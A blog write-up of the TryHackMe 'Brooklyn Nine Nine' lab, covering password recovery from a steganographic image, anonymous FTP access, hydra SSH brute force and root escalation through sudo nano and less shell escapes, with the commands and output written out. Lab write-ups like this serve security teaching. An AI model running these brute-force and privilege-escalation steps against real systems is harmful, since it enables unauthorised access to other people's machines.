---
title: "TryHackMe: Brooklyn Nine Nine Write-up"
date: 2025-09-14 14:00:00
categories: [TryHackMe, Challenges]
tag: [SSH brute force, Forensics, web]
author: Aisha
---

## Introduction

**Challenge Link:** [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)

The challenge described that there are two ways to hack into the machine, I tried both ways.

## Steganography

 

 Start with port scanning

```python
nmap 10.10.178.223    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 11:34 +03
Nmap scan report for 10.10.178.223
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.78 seconds
```

The result from port scanning showed three ports open, we will start with the http service: 

![Alt](/images/Brooklyninenine/1.webp)

Looking into the source code, there was a hint that there is a hidden data inside the image

![Alt](/images/Brooklyninenine/2.webp)

Download the image and start the inspection

```python
$ wget "http://10.10.178.223:80/brooklyn99.jpg"                                             
```

View the metadata of the image

```python
 file brooklyn99.jpg 
brooklyn99.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 533x300, components 3
                                                                                                  
┌──(kali㉿kali)-[~/Documents/tryhackme/tes]
└─$ exiftool brooklyn99.jpg            
ExifTool Version Number         : 12.57
File Name                       : brooklyn99.jpg
Directory                       : .
File Size                       : 70 kB
File Modification Date/Time     : 2020:05:26 12:01:39+03:00
File Access Date/Time           : 2025:09:09 11:38:54+03:00
File Inode Change Date/Time     : 2025:09:09 11:38:43+03:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 533
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 533x300
Megapixels                      : 0.160
```

I used strings as a start, but didn't show anything interested 

```python
 strings --bytes=8  brooklyn99.jpg        
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
mz\C(?3:|
t-Vv2G4c
Mm22<r.C
3*IWr_i'
Z$&DF,^r
DJN~D\{}
        d#td0`X
}NU\C:ls
-on|@c6h
6G89*GpO
$-r7VIi:
H;F[nNF[
=n}RKq"G
                  
```

I also used `StegSolve-1.4.jar,` and  `binwalk`,  but it didn't help. Thus, the next option is to use `stegohide` to see if the embedded text is protected with password, if so, we will use `stegoseek` to crack the password

```bash
─$ steghide info  brooklyn99.jpg             
"brooklyn99.jpg":
  format: jpeg
  capacity: 3.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: can not uncompress data. compressed data is corrupted.

```

actually, even if it prompts for password that doesn't confirm that there is a hidden data protected with a password, but we will try to crack it anyway. 

```bash
$ stegseek --crack -sf brooklyn99.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
                                                                                              
└─$ cat brooklyn99.jpg.out 
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

The hidden data was a text file that has Holt’s password. I tried to ssh to this user and it was a success!

```bash
ssh holt@10.10.178.223
holt@10.10.178.223's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ id
uid=1002(holt) gid=1002(holt) groups=1002(holt)
holt@brookly_nine_nine:~$ sudo -l 
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
    
holt@brookly_nine_nine:~$ ls -l
total 8
-rw------- 1 root root 110 May 18  2020 nano.save
-rw-rw-r-- 1 holt holt  33 May 17  2020 user.txt
```

The `sudoers`  file allows Holt to use `nano` with sudo, referred to this [source](https://gtfobins.github.io/gtfobins/nano/#sudo) to abuse the binary to gain privileged access.

![Alt](/images/Brooklyninenine/3.webp)

## FTP Access

Now we will try the other way, using the FTP service to find possible vulnerabilities.

```bash
─$ ftp 10.10.178.223 21
Connected to 10.10.178.223.
220 (vsFTPd 3.0.3)
Name (10.10.178.223:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
ftp> ls 
229 Entering Extended Passive Mode (|||20279|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||39692|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |*****************************************************|   119        2.52 MiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (0.79 KiB/s)

```

As initial, the service allows for `anonymous` access, then we find a text file which we transfer it to our local machine.

```bash
$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

The text gives us a hint that the password for ssh access of Jake is weak, thus it is possible to brute force it with `hydra`. 

```bash
hydra -l "jake" -P /usr/share/wordlists/rockyou.txt  ssh://10.10.178.223  
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-09 13:33:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.178.223:22/
[22][ssh] host: 10.10.178.223   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-09 13:33:34
```

With the cracked password, ssh to Jake machine. 

```bash
 ssh jake@10.10.178.223
jake@10.10.178.223's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ id
uid=1000(jake) gid=1000(jake) groups=1000(jake)
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:~$ 
```

We can use `less` to exploit it to gain root access via opening a file with `sudo` rights, then pass this command to it: 

```bash

!/bin/sh
```

source :  [gtfobins](https://gtfobins.github.io/gtfobins/less/#sudo)

![Alt](/images/Brooklyninenine/4.webp)

At the bottom of the file we executed the bash command, and we got a root shell! 

![Alt](/images/Brooklyninenine/5.webp)
